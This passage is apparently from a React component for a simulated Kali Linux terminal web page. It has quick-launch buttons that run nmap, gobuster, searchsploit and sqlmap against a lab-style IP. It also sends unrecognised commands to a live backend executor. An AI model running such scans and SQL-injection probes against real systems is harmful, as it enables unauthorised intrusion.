  F11            Toggle Fullscreen Mode`;
      updateActiveTab(prev => ({
        history: [...prev.history, { command: cmd, user: prev.user, cwd: prev.cwd, content: { text: out } }]
      }));
      return;
    }

    // ─── LIVE BACKEND EXECUTION FALLBACK ─────────────────────
    setLoading(true);
    try {
      const result = await terminalApi.execute(cmd);
      const out = (result.stdout || result.stderr || "").trim();
      updateActiveTab(prev => ({
        history: [...prev.history, {
          command: cmd,
          user: prev.user,
          cwd: prev.cwd,
          duration_ms: result.duration_ms,
          status: result.status,
          content: { text: out || "(Command returned no output)" }
        }]
      }));
    } catch (err) {
      updateActiveTab(prev => ({
        history: [...prev.history, {
          command: cmd,
          user: prev.user,
          cwd: prev.cwd,
          status: "failed",
          content: {
            text: `zsh: command not found: ${primary}\n(Type "help" or "kali-tools" to view the cyber arsenal)`
          }
        }]
      }));
    } finally {
      setLoading(false);
      inputRef.current?.focus();
    }
  };

  const handleFormSubmit = (e) => {
    e.preventDefault();
    executeCommand(activeTab.input);
  };

  const handleKeyDown = (e) => {
    if (e.key === "Tab") {
      e.preventDefault();
      handleAutocomplete();
      return;
    }
    if (e.key === "ArrowRight") {
      if (activeTab.ghostText) {
        e.preventDefault();
        const full = activeTab.input + activeTab.ghostText;
        updateActiveTab({ input: full, ghostText: "" });
        return;
      }
    }
    if (e.key === "ArrowUp") {
      e.preventDefault();
      if (activeTab.cmdHistory.length > 0) {
        const newIdx = Math.min(activeTab.historyIdx + 1, activeTab.cmdHistory.length - 1);
        updateActiveTab({
          historyIdx: newIdx,
          input: activeTab.cmdHistory[newIdx],
          ghostText: ""
        });
      }
    } else if (e.key === "ArrowDown") {
      e.preventDefault();
      if (activeTab.historyIdx > 0) {
        const newIdx = activeTab.historyIdx - 1;
        updateActiveTab({
          historyIdx: newIdx,
          input: activeTab.cmdHistory[newIdx],
          ghostText: ""
        });
      } else {
        updateActiveTab({
          historyIdx: -1,
          input: "",
          ghostText: ""
        });
      }
    }
  };

  const copyEntry = (text, index) => {
    navigator.clipboard.writeText(text);
    setCopiedIndex(index);
    setTimeout(() => setCopiedIndex(null), 1500);
  };

  const exportSessionLog = () => {
    const log = activeTab.history
      .map(entry => {
        let body = "";
        if (entry.content?.text) body = entry.content.text;
        else if (entry.content?.isNeofetch) body = "[Neofetch System Info]";
        return `$ ${entry.command}\n${body}\n`;
      })
      .join("\n--------------------\n\n");

    const blob = new Blob([log], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `kali-session-${Date.now()}.log`;
    a.click();
    URL.revokeObjectURL(url);
  };

  // Nano Save Callback
  const handleNanoSave = (fname, newContent) => {
    const currentDirKey = activeTab.cwd === "~" ? "/home/kali" : activeTab.cwd;
    setTabs(prevTabs =>
      prevTabs.map(tab => {
        if (tab.id !== activeTabId) return tab;
        const fsCopy = { ...tab.fs };
        const list = [...(fsCopy[currentDirKey] || [])];
        const idx = list.findIndex(f => f.name === fname);
        if (idx >= 0) {
          list[idx] = { ...list[idx], content: newContent, size: `${newContent.length}B` };
        } else {
          list.push({
            name: fname,
            type: "file",
            perms: "-rw-r--r--",
            owner: tab.user,
            group: tab.user,
            size: `${newContent.length}B`,
            date: "Sep 03 23:40",
            content: newContent
          });
        }
        fsCopy[currentDirKey] = list;
        return { ...tab, fs: fsCopy };
      })
    );
  };

  return (
    <div
      ref={terminalWrapperRef}
      className={`space-y-4 animate-fade-in ${
        isFullscreen
          ? "fixed inset-0 z-50 bg-[#070b14] p-4 flex flex-col justify-between overflow-hidden"
          : "max-w-6xl"
      }`}
    >
      {/* Top Header bar */}
      {!isFullscreen && (
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
          <div>
            <h1 className="text-xl font-bold tracking-tight text-white flex items-center gap-2.5">
              <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-cyan-500 to-blue-600 flex items-center justify-center shadow-lg shadow-cyan-500/25">
                <TerminalIcon className="w-4.5 h-4.5 text-white" />
              </div>
              <span className="font-mono">Kali Linux Workstation</span>
              <span className="text-[10px] px-2 py-0.5 rounded-full bg-cyan-500/10 border border-cyan-500/30 text-cyan-400 font-mono uppercase tracking-wider font-semibold">
                ZSH Rolling Pro
              </span>
            </h1>
            <p className="text-xs text-slate-400 mt-1">
              Interactive Kali Linux shell with ZSH ghost suggestions, in-terminal Nano & Htop, split panes, and cyber arsenal.
            </p>
          </div>

          <div className="flex items-center gap-2 flex-wrap">
            {/* Split Screen Button */}
            <div className="flex items-center bg-[#0f172a] border border-[#1e293b] rounded-lg p-0.5">
              <button
                onClick={() => setSplitMode("none")}
                className={`p-1.5 rounded ${splitMode === "none" ? "bg-cyan-500/20 text-cyan-300" : "text-slate-400"}`}
                title="Single Pane"
              >
                <Square className="w-3.5 h-3.5" />
              </button>
              <button
                onClick={() => setSplitMode("horizontal")}
                className={`p-1.5 rounded ${splitMode === "horizontal" ? "bg-cyan-500/20 text-cyan-300" : "text-slate-400"}`}
                title="Split Horizontally (Terminator style)"
              >
                <Columns className="w-3.5 h-3.5" />
              </button>
              <button
                onClick={() => setSplitMode("vertical")}
                className={`p-1.5 rounded ${splitMode === "vertical" ? "bg-cyan-500/20 text-cyan-300" : "text-slate-400"}`}
                title="Split Vertically"
              >
                <Rows className="w-3.5 h-3.5" />
              </button>
            </div>

            {/* Cheat Sheet Button */}
            <button
              onClick={() => setShowCheatSheet(true)}
              className="px-2.5 py-1.5 rounded-lg bg-[#0f172a] border border-[#1e293b] hover:border-cyan-500/40 text-slate-300 hover:text-cyan-400 text-xs font-mono flex items-center gap-1.5 transition-colors"
              title="Open PenTest Cheat Sheet"
            >
              <BookOpen className="w-3.5 h-3.5 text-cyan-400" />
              <span>Cheat Sheet</span>
            </button>

            {/* Theme Selector */}
            <select
              value={themeKey}
              onChange={(e) => setThemeKey(e.target.value)}
              className="bg-[#0f172a] border border-[#1e293b] text-slate-300 text-xs rounded-lg px-2.5 py-1.5 font-mono focus:outline-none focus:border-cyan-500 transition-colors"
            >
              {Object.entries(THEMES).map(([k, t]) => (
                <option key={k} value={k}>{t.name}</option>
              ))}
            </select>

            {/* Audio Toggle */}
            <button
              onClick={() => setSoundEnabled(s => !s)}
              className="p-1.5 rounded-lg bg-[#0f172a] border border-[#1e293b] text-slate-400 hover:text-white text-xs transition-colors"
              title={soundEnabled ? "Mute Terminal Bell" : "Enable Terminal Bell"}
            >
              {soundEnabled ? <Volume2 className="w-4 h-4 text-cyan-400" /> : <VolumeX className="w-4 h-4" />}
            </button>

            {/* Font Size Adjust */}
            <div className="flex items-center bg-[#0f172a] border border-[#1e293b] rounded-lg p-0.5">
              <button
                onClick={() => setFontSize("text-[11px]")}
                className={`px-2 py-0.5 text-[11px] font-mono rounded ${fontSize === "text-[11px]" ? "bg-cyan-500/20 text-cyan-300 font-bold" : "text-slate-400"}`}
              >
                A-
              </button>
              <button
                onClick={() => setFontSize("text-xs")}
                className={`px-2 py-0.5 text-xs font-mono rounded ${fontSize === "text-xs" ? "bg-cyan-500/20 text-cyan-300 font-bold" : "text-slate-400"}`}
              >
                A
              </button>
              <button
                onClick={() => setFontSize("text-sm")}
                className={`px-2 py-0.5 text-xs font-mono rounded ${fontSize === "text-sm" ? "bg-cyan-500/20 text-cyan-300 font-bold" : "text-slate-400"}`}
              >
                A+
              </button>
            </div>

            {/* Export Log */}
            <button
              onClick={exportSessionLog}
              className="p-1.5 rounded-lg bg-[#0f172a] border border-[#1e293b] text-slate-400 hover:text-white text-xs transition-colors"
              title="Export Terminal Session"
            >
              <Download className="w-4 h-4" />
            </button>

            {/* Fullscreen */}
            <button
              onClick={() => setIsFullscreen(prev => !prev)}
              className="p-1.5 rounded-lg bg-[#0f172a] border border-[#1e293b] text-slate-400 hover:text-white text-xs transition-colors"
              title="Toggle Fullscreen"
            >
              {isFullscreen ? <Minimize2 className="w-4 h-4" /> : <Maximize2 className="w-4 h-4" />}
            </button>
          </div>
        </div>
      )}

      {/* Cyber Arsenal Quick Launcher Drawer */}
      {showQuickArsenal && (
        <div className="p-3 rounded-xl bg-[#0c1120] border border-[#1a2337] flex items-center justify-between gap-2 overflow-x-auto text-xs font-mono">
          <div className="flex items-center gap-2 shrink-0 text-slate-400 text-[11px]">
            <Layers className="w-3.5 h-3.5 text-cyan-400" />
            <span className="font-semibold text-slate-300">QUICK ARSENAL:</span>
          </div>

          <div className="flex items-center gap-1.5 flex-wrap">
            {[
              { label: "cmatrix (rain)", cmd: "cmatrix" },
              { label: "htop (monitor)", cmd: "htop" },
              { label: "nano notes.txt", cmd: "nano notes.txt" },
              { label: "nmap target", cmd: "nmap -sV -sC 10.10.11.23" },
              { label: "msfconsole", cmd: "msfconsole" },
              { label: "searchsploit", cmd: "searchsploit vsftpd 2.3.4" },
              { label: "gobuster", cmd: "gobuster dir -u http://10.10.11.23 -w /home/kali/wordlists/common.txt" },
              { label: "sqlmap", cmd: "sqlmap -u http://10.10.11.23/item?id=1 --dbs" },
              { label: "ifconfig", cmd: "ifconfig" },
              { label: "sudo su", cmd: "sudo su" },
            ].map(item => (
              <button
                key={item.cmd}
                onClick={() => {
                  executeCommand(item.cmd);
                }}
                className="px-2.5 py-1 rounded bg-[#10172b] hover:bg-cyan-500/20 border border-[#1e2c45] hover:border-cyan-500/40 text-slate-300 hover:text-cyan-300 text-[11px] font-mono transition-colors flex items-center gap-1 shrink-0"
              >
                <Play className="w-2.5 h-2.5 text-cyan-400" />
                {item.label}
              </button>
            ))}
          </div>
        </div>
      )}

      {/* ─── KALI LINUX TERMINAL SHELL ───────────────────────────── */}
      <div
        className={`relative rounded-xl border overflow-hidden shadow-2xl transition-all duration-200 flex flex-col ${
          isFullscreen ? "flex-1 h-full" : "min-h-[620px]"
        }`}
        style={{
          backgroundColor: theme.bodyBg,
          borderColor: theme.border
        }}
      >
        {/* QTerminal Window Topbar */}
        <div
          className="flex items-center justify-between px-3 py-2 border-b select-none"
          style={{
            backgroundColor: theme.headerBg,
            borderColor: theme.border
          }}
        >
          {/* Left: Window controls & Kali Logo */}
          <div className="flex items-center gap-3">
            <div className="flex items-center gap-1.5">
              <button
                onClick={() => closeTab(activeTabId)}
                className="w-3 h-3 rounded-full bg-rose-500 hover:bg-rose-600 transition-colors flex items-center justify-center group"
                title="Close Tab"
              >
                <X className="w-2 h-2 text-rose-950 opacity-0 group-hover:opacity-100" />
              </button>
              <button
                onClick={() => updateActiveTab({ history: [] })}
                className="w-3 h-3 rounded-full bg-amber-500 hover:bg-amber-600 transition-colors flex items-center justify-center group"
                title="Clear Screen"
              >
                <RotateCcw className="w-2 h-2 text-amber-950 opacity-0 group-hover:opacity-100" />
              </button>
              <button
                onClick={() => setIsFullscreen(prev => !prev)}
                className="w-3 h-3 rounded-full bg-emerald-500 hover:bg-emerald-600 transition-colors flex items-center justify-center group"
                title="Toggle Fullscreen"
              >
                <Maximize2 className="w-2 h-2 text-emerald-950 opacity-0 group-hover:opacity-100" />
              </button>
            </div>

            {/* Kali Dragon Emblem */}
            <div className="flex items-center gap-1.5 text-xs font-mono text-slate-300 font-semibold pl-1 border-l border-[#243147]">
              <span className={theme.dragonColor}>㉿</span>
              <span className="tracking-wide">qterminal</span>
            </div>
          </div>

          {/* Center: Tabs */}
          <div className="flex items-center gap-1 overflow-x-auto max-w-xl mx-2 py-0.5">
            {tabs.map(tab => {
              const isActive = tab.id === activeTabId;
              const isRoot = tab.user === "root";
              return (
                <div
                  key={tab.id}
                  onClick={() => setActiveTabId(tab.id)}
                  className={`group flex items-center gap-2 px-3 py-1 rounded-md text-xs font-mono cursor-pointer transition-colors border ${
                    isActive
                      ? "bg-[#141d2f] text-white border-cyan-500/40 shadow-sm"
                      : "bg-[#0a0e18] text-slate-400 border-transparent hover:text-slate-200"
                  }`}
                >
                  <span className={isRoot ? "text-rose-400 font-bold" : "text-cyan-400"}>
                    {isRoot ? "💀" : "㉿"}
                  </span>
                  <span className="truncate max-w-[140px]">{tab.title}</span>
                  <button
                    onClick={(e) => closeTab(tab.id, e)}
                    className="p-0.5 rounded hover:bg-rose-500/20 hover:text-rose-400 text-slate-500 opacity-60 group-hover:opacity-100 transition-all"
                  >
                    <X className="w-3 h-3" />
                  </button>
                </div>
              );
            })}

            {/* New Tab Button */}
            <button
              onClick={createNewTab}
              className="p-1 rounded-md bg-[#0a0e18] hover:bg-[#141d2f] border border-[#1a2337] text-slate-400 hover:text-white transition-colors"
              title="Open New Tab (Ctrl+Shift+T)"
            >
              <Plus className="w-3.5 h-3.5" />
            </button>
          </div>

          {/* Right Status */}
          <div className="flex items-center gap-3 text-[11px] font-mono">
            {activeTab.user === "root" ? (
              <span className="flex items-center gap-1 text-rose-400 font-bold px-2 py-0.5 rounded bg-rose-950/40 border border-rose-900/50">
                <Skull className="w-3 h-3" />
                ROOT MODE
              </span>
            ) : (
              <span className="flex items-center gap-1 text-cyan-400 font-medium px-2 py-0.5 rounded bg-cyan-950/30 border border-cyan-900/40">
                <Shield className="w-3 h-3" />
                KALI (UNPRIVILEGED)
              </span>
            )}

            <div className="hidden sm:flex items-center gap-1.5 text-slate-400">
              <Wifi className="w-3 h-3 text-emerald-400" />
              <span>tun0: 10.10.14.23</span>
            </div>
          </div>
        </div>

        {/* QTerminal Sub-menu bar */}
        <div
          className="flex items-center gap-4 px-4 py-1 border-b text-[11px] font-mono text-slate-400 select-none"
          style={{
            backgroundColor: theme.bg,
            borderColor: theme.border
          }}
        >
          <span className="hover:text-white cursor-pointer" onClick={() => createNewTab()}>File</span>
          <span className="hover:text-white cursor-pointer" onClick={() => updateActiveTab({ history: [] })}>Edit</span>
          <span className="hover:text-white cursor-pointer" onClick={() => setIsFullscreen(f => !f)}>View</span>
          <span className="hover:text-white cursor-pointer" onClick={() => executeCommand("kali-tools")}>PenTest Tools</span>
          <span className="hover:text-white cursor-pointer" onClick={() => setShowCheatSheet(true)}>Payloads</span>
          <span className="hover:text-white cursor-pointer" onClick={() => executeCommand("help")}>Help</span>
          <div className="ml-auto text-[10px] text-slate-500">
            Press <kbd className="bg-[#121929] px-1 py-0.5 rounded border border-[#1d273a] text-slate-400">→</kbd> to accept suggestion
          </div>
        </div>

        {/* ─── TERMINAL OUTPUT VIEWPORT (WITH SPLIT-SCREEN SUPPORT) ── */}
        <div className={`flex-1 flex overflow-hidden ${splitMode === "vertical" ? "flex-col" : "flex-row"}`}>
          {/* PRIMARY PANE */}
          <div
            ref={scrollRef}
            onClick={() => inputRef.current?.focus()}
            className={`p-4 flex-1 overflow-y-auto font-mono space-y-4 cursor-text selection:bg-cyan-500/30 ${fontSize}`}
            style={{ backgroundColor: theme.bg }}
          >
            {/* Active Interactive Application (cmatrix, htop, nano) */}
            {activeApp?.type === "cmatrix" && (
              <CMatrixCanvas onExit={() => setActiveApp(null)} />
            )}

            {activeApp?.type === "htop" && (
              <HTopView onExit={() => setActiveApp(null)} />
            )}

            {activeApp?.type === "nano" && (
              <NanoEditor
                filename={activeApp.file}
                initialContent={activeApp.content}
                onSave={handleNanoSave}
                onExit={() => setActiveApp(null)}
              />
            )}

            {/* History Entries */}
            {!activeApp && activeTab.history.map((item, idx) => {
              const isRoot = item.user === "root";
              const promptUser = item.user || activeTab.user;
              const promptHost = activeTab.hostname;
              const promptCwd = item.cwd || activeTab.cwd;

              return (
                <div key={idx} className="space-y-1.5 group">
                  {/* Two-line ZSH Prompt or MSF Prompt */}
                  {item.prompt ? (
                    <div className="flex items-center gap-1.5 text-cyan-400 font-bold">
                      <span>{item.prompt}</span>
                      <span className="text-white font-normal">{item.command}</span>
                    </div>
                  ) : (
                    <div className="select-text">
                      {/* Line 1: ┌──(user㉿host)-[cwd] */}
                      <div className="flex items-center gap-0.5 leading-none">
                        <span className={isRoot ? "text-rose-500" : "text-blue-500 font-semibold"}>┌──(</span>
                        <span className={isRoot ? "text-rose-400 font-bold" : "text-cyan-400 font-semibold"}>
                          {promptUser}
                        </span>
                        <span className={isRoot ? "text-rose-500" : "text-blue-500"}>
                          {isRoot ? "💀" : "㉿"}
                        </span>
                        <span className={isRoot ? "text-rose-400 font-bold" : "text-cyan-400 font-semibold"}>
                          {promptHost}
                        </span>
                        <span className={isRoot ? "text-rose-500" : "text-blue-500 font-semibold"}>)-[</span>
                        <span className="text-white font-medium">{promptCwd}</span>
                        <span className={isRoot ? "text-rose-500" : "text-blue-500 font-semibold"}>]</span>
                      </div>

                      {/* Line 2: └─$ command */}
                      <div className="flex items-center gap-1.5 mt-0.5">
                        <span className={isRoot ? "text-rose-500 font-bold" : "text-blue-500 font-semibold"}>
                          {isRoot ? "└─#" : "└─$"}
                        </span>
                        <span className="text-slate-100 font-medium">{item.command}</span>

                        {/* Copy output button on hover */}
                        {item.content?.text && (
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              copyEntry(item.content.text, idx);
                            }}
                            className="opacity-0 group-hover:opacity-100 ml-auto p-1 rounded text-slate-500 hover:text-slate-200 transition-opacity"
                            title="Copy Output"
                          >
                            {copiedIndex === idx ? (
                              <Check className="w-3 h-3 text-emerald-400" />
                            ) : (
                              <Copy className="w-3 h-3" />
                            )}
                          </button>
                        )}
                      </div>
                    </div>
                  )}

                  {/* Output Content */}
                  {/* 1. Neofetch Render */}
                  {item.content?.isNeofetch && (
                    <div className="py-2 grid grid-cols-1 md:grid-cols-12 gap-4 items-center bg-[#090d16]/70 rounded-lg p-3 border border-[#162033]">
                      {/* Dragon ASCII */}
                      <div className="md:col-span-5 text-cyan-400 font-mono text-[11px] leading-tight select-all">
                        <pre className="whitespace-pre overflow-x-auto">{KALI_DRAGON_ASCII}</pre>
                      </div>

                      {/* Specs Table */}
                      <div className="md:col-span-7 font-mono text-xs space-y-1">
                        {item.content.specs.map((spec, sIdx) => {
                          if (spec.header) {
                            return (
                              <div key={sIdx} className="text-cyan-300 font-bold text-sm">
                                {spec.label}
                              </div>
                            );
                          }
                          if (spec.divider) {
                            return (
                              <div key={sIdx} className="text-slate-600">
                                {spec.label}
                              </div>
                            );
                          }
                          return (
                            <div key={sIdx} className="flex items-center gap-2">
                              <span className="text-cyan-400 font-semibold min-w-[90px]">{spec.label}:</span>
                              <span className="text-slate-200">{spec.value}</span>
                            </div>
                          );
                        })}

                        {/* Color blocks */}
                        <div className="pt-2 flex items-center gap-1">
                          {["#000", "#ef4444", "#10b981", "#eab308", "#3b82f6", "#a855f7", "#06b6d4", "#f8fafc"].map((color, cIdx) => (
                            <span
                              key={cIdx}
                              className="w-4 h-3.5 rounded-sm inline-block shadow-inner"
                              style={{ backgroundColor: color }}
                            />
                          ))}
                        </div>
                      </div>
                    </div>
                  )}

                  {/* 2. File Listing (ls / dir) */}
                  {item.content?.isLs && (
                    <div className="py-1">
                      {item.content.showAll ? (
                        <div className="space-y-0.5 text-xs">
                          <div className="text-slate-500 text-[10px]">total {item.content.files.length * 4}</div>
                          {item.content.files.map((f, fIdx) => (
                            <div key={fIdx} className="flex items-center gap-3">
                              <span className="text-slate-500 font-mono">{f.perms}</span>
                              <span className="text-slate-400 font-mono w-12">{f.owner}</span>
                              <span className="text-slate-400 font-mono w-12">{f.group}</span>
                              <span className="text-slate-400 font-mono w-14 text-right">{f.size}</span>
                              <span className="text-slate-500 font-mono text-[11px]">{f.date}</span>
                              <span
                                className={`font-semibold ${
                                  f.type === "dir"
                                    ? "text-blue-400 font-bold flex items-center gap-1"
                                    : f.perms.includes("x")
                                    ? "text-emerald-400 font-bold"
                                    : "text-slate-200"
                                }`}
                              >
                                {f.type === "dir" && <Folder className="w-3 h-3 inline text-blue-400" />}
                                {f.name}
                              </span>
                            </div>
                          ))}
                        </div>
                      ) : (
                        <div className="flex items-center gap-4 flex-wrap">
                          {item.content.files.map((f, fIdx) => (
                            <span
                              key={fIdx}
                              className={`font-semibold ${
                                f.type === "dir"
                                  ? "text-blue-400 font-bold flex items-center gap-1"
                                  : f.perms.includes("x")
                                  ? "text-emerald-400 font-bold"
                                  : "text-slate-200"
                              }`}
                            >
                              {f.type === "dir" && <Folder className="w-3 h-3 inline text-blue-400" />}
                              {f.name}
                            </span>
                          ))}
                        </div>
                      )}
                    </div>
                  )}

                  {/* 3. Text output */}
                  {item.content?.text && (
                    <pre className="text-slate-200 whitespace-pre-wrap leading-relaxed py-1 overflow-x-auto font-mono">
                      {item.content.text}
                    </pre>
                  )}
                </div>
              );
            })}

            {/* Loader */}
            {loading && (
              <div className="flex items-center gap-2 text-cyan-400 font-mono text-xs py-1">
                <Loader2 className="w-3.5 h-3.5 animate-spin" />
                <span>Executing payload...</span>
              </div>
            )}

            {/* Active Input Line (with ZSH Syntax Highlighting & Ghost Suggestions) */}
            {!activeApp && (
              <div className="pt-2">
                {activeTab.msfMode ? (
                  // Metasploit prompt
                  <form onSubmit={handleFormSubmit} className="flex items-center gap-1.5">
                    <span className="text-cyan-400 font-bold shrink-0">{activeTab.msfPrompt}</span>
                    <input
                      ref={inputRef}
                      type="text"
                      value={activeTab.input}
                      onChange={handleInputChange}
                      onKeyDown={handleKeyDown}
                      disabled={loading}
                      autoComplete="off"
                      spellCheck={false}
                      className="flex-1 bg-transparent text-white focus:outline-none font-mono text-xs"
                    />
                  </form>
                ) : (
                  // Authentic Kali Two-Line ZSH Prompt with Syntax & Ghost Text
                  <form onSubmit={handleFormSubmit} className="space-y-0.5">
                    {/* Line 1: ┌──(user㉿kali)-[cwd] */}
                    <div className="flex items-center gap-0.5 leading-none select-none">
                      <span className={activeTab.user === "root" ? "text-rose-500" : "text-blue-500 font-semibold"}>┌──(</span>
                      <span className={activeTab.user === "root" ? "text-rose-400 font-bold" : "text-cyan-400 font-semibold"}>
                        {activeTab.user}
                      </span>
                      <span className={activeTab.user === "root" ? "text-rose-500" : "text-blue-500"}>
                        {activeTab.user === "root" ? "💀" : "㉿"}
                      </span>
                      <span className={activeTab.user === "root" ? "text-rose-400 font-bold" : "text-cyan-400 font-semibold"}>
                        {activeTab.hostname}
                      </span>
                      <span className={activeTab.user === "root" ? "text-rose-500" : "text-blue-500 font-semibold"}>)-[</span>
                      <span className="text-white font-medium">{activeTab.cwd}</span>
                      <span className={activeTab.user === "root" ? "text-rose-500" : "text-blue-500 font-semibold"}>]</span>
                    </div>

                    {/* Line 2: └─$ input with inline syntax highlight overlay */}
                    <div className="flex items-center gap-1.5 relative">
                      <span className={activeTab.user === "root" ? "text-rose-500 font-bold" : "text-blue-500 font-semibold"}>
                        {activeTab.user === "root" ? "└─#" : "└─$"}
                      </span>

                      {/* Highlighted syntax + ghost text overlay */}
                      <div className="absolute left-6 right-0 top-0 bottom-0 pointer-events-none font-mono text-xs flex items-center whitespace-pre overflow-hidden">
                        {renderHighlightedInput(activeTab.input, activeTab.ghostText)}
                      </div>

                      {/* Real transparent input for caret & typing */}
                      <input
                        ref={inputRef}
                        type="text"
                        value={activeTab.input}
                        onChange={handleInputChange}
                        onKeyDown={handleKeyDown}
                        disabled={loading}
                        autoComplete="off"
                        spellCheck={false}
                        className="flex-1 bg-transparent text-transparent caret-cyan-400 focus:outline-none font-mono text-xs z-10"
                      />
                    </div>
                  </form>
                )}
              </div>
            )}
          </div>

          {/* SECONDARY SPLIT PANE (IF SPLIT MODE ACTIVE) */}
          {splitMode !== "none" && (
            <div
              className={`p-4 overflow-y-auto font-mono text-xs space-y-2 border-l border-t border-[#1a2538] flex-1`}
              style={{ backgroundColor: "#060911" }}
            >
              <div className="flex items-center justify-between pb-1 border-b border-[#182336] text-[11px] text-slate-400">
                <span className="text-cyan-400 font-semibold">Pane 2: Background Network Monitor</span>
                <span className="text-emerald-400 flex items-center gap-1">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse" />
                  LISTENING
                </span>
              </div>
              <pre className="text-[11px] text-slate-300 leading-relaxed overflow-x-auto">
{`[*] tcpdump -i tun0 -n -s 0
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
23:42:15.102 IP 10.10.14.23.4444 > 10.10.11.23.49152: Flags [P.], seq 1:45, ack 1
23:42:15.105 IP 10.10.11.23.49152 > 10.10.14.23.4444: Flags [.], ack 45
23:42:15.108 IP 10.10.14.23.4444 > 10.10.11.23.49152: Flags [P.], seq 45:128, ack 1
23:42:16.002 IP 10.10.11.23 > 10.10.14.23: ICMP echo request, id 142, seq 1, length 64
23:42:16.002 IP 10.10.14.23 > 10.10.11.23: ICMP echo reply, id 142, seq 1, length 64
[+] 5 packets captured on tun0`}
              </pre>
            </div>
          )}
        </div>

        {/* ─── TERMINAL FOOTER STATUS BAR ─────────────────────── */}
        <div
          className="flex items-center justify-between px-3 py-1.5 border-t text-[10px] font-mono text-slate-500 select-none"
          style={{
            backgroundColor: theme.headerBg,
            borderColor: theme.border
          }}
        >
          <div className="flex items-center gap-3">
            <span className="flex items-center gap-1">
              <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
              STATUS: ONLINE
            </span>
            <span>ENCODING: UTF-8</span>
            <span>SHELL: /usr/bin/zsh</span>
            <span>SYNTAX: AUTO-HIGHLIGHT</span>
          </div>

          <div className="flex items-center gap-4">
            <span>HISTORY: {activeTab.cmdHistory.length} cmds</span>
            <span>ROWS: 24 COLS: 80</span>
          </div>
        </div>
      </div>

      {/* ─── PENTEST PAYLOAD & CHEAT SHEET MODAL ────────────────── */}
      {showCheatSheet && (
        <div className="fixed inset-0 z-50 bg-black/75 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-[#0b101c] border border-[#1f2e48] rounded-2xl max-w-2xl w-full p-5 shadow-2xl space-y-4 max-h-[85vh] flex flex-col font-mono text-xs">
            <div className="flex items-center justify-between border-b border-[#1a263c] pb-3">
              <div className="flex items-center gap-2">
                <BookOpen className="w-4 h-4 text-cyan-400" />
                <h3 className="font-bold text-white text-sm">Penetration Testing Payload Arsenal</h3>
              </div>
              <button onClick={() => setShowCheatSheet(false)} className="text-slate-400 hover:text-white">
                <X className="w-4 h-4" />
              </button>
            </div>

            <div className="flex-1 overflow-y-auto space-y-4 pr-1">
              {CHEATSHEET_PAYLOADS.map((cat, idx) => (
                <div key={idx} className="space-y-2">
                  <h4 className="text-cyan-400 font-semibold text-xs tracking-wider uppercase flex items-center gap-1.5">
                    <span className="w-1.5 h-1.5 rounded-full bg-cyan-400" />
                    {cat.category}
                  </h4>
                  <div className="space-y-2">
                    {cat.items.map((item, iIdx) => (
                      <div
                        key={iIdx}
                        className="p-2.5 rounded-lg bg-[#070b14] border border-[#172338] hover:border-cyan-500/40 transition-colors flex items-center justify-between gap-3"
                      >
                        <div className="flex-1 overflow-hidden">
                          <div className="font-semibold text-slate-200 text-[11px] mb-1">{item.name}</div>
                          <code className="text-cyan-300 text-[10px] break-all block">{item.cmd}</code>
                        </div>
                        <div className="flex items-center gap-1.5 shrink-0">
                          <button
                            onClick={() => {
                              navigator.clipboard.writeText(item.cmd);
                              setShowCheatSheet(false);
                            }}
                            className="px-2 py-1 rounded bg-[#10192b] hover:bg-cyan-500/20 text-slate-300 hover:text-cyan-300 border border-[#1e2a40] text-[10px] flex items-center gap-1"
                            title="Copy to Clipboard"
                          >
                            <Copy className="w-3 h-3" /> Copy
                          </button>
                          <button
                            onClick={() => {
                              setShowCheatSheet(false);
                              updateActiveTab({ input: item.cmd });
                              executeCommand(item.cmd);
                            }}
                            className="px-2 py-1 rounded bg-cyan-600/20 hover:bg-cyan-600/40 text-cyan-300 border border-cyan-500/30 text-[10px] flex items-center gap-1"
                            title="Run in Terminal"
                          >
                            <Play className="w-3 h-3" /> Run
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
